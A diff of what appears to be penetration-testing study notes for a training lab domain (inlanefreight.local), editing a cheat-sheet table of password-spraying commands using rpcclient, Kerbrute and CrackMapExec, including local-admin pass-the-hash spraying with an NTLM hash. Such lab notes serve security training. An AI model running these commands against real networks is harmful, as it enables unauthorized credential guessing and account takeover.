@@ -25,13 +25,13 @@
 
 # ⚡ 2. Command Cheat Sheet
 
-| Goal                             | Command                                                                                                                  |
-| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
-| Password spray with `rpcclient`  | `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` |
-| Password spray with Kerbrute     | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 usernames.txt Welcome1`                                   |
-| Password spray with CrackMapExec | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                           |
-| Validate discovered credentials  | `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                            |
-| Local-admin hash spraying        | `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`        |
+| Goal                             | Command                                                                                                                                                 |
+| -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Password spray with `rpcclient`  | ```<br>for u in $(cat usernames.txt); do rpcclient -U "inlanefreight.local/$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done<br>``` |
+| Password spray with Kerbrute     | `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 usernames.txt Welcome1`                                                                  |
+| Password spray with CrackMapExec | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +`                                                                          |
+| Validate discovered credentials  | `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`                                                                                           |
+| Local-admin hash spraying        | `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +`                                       |
 
 ### 🧰 Tools
 
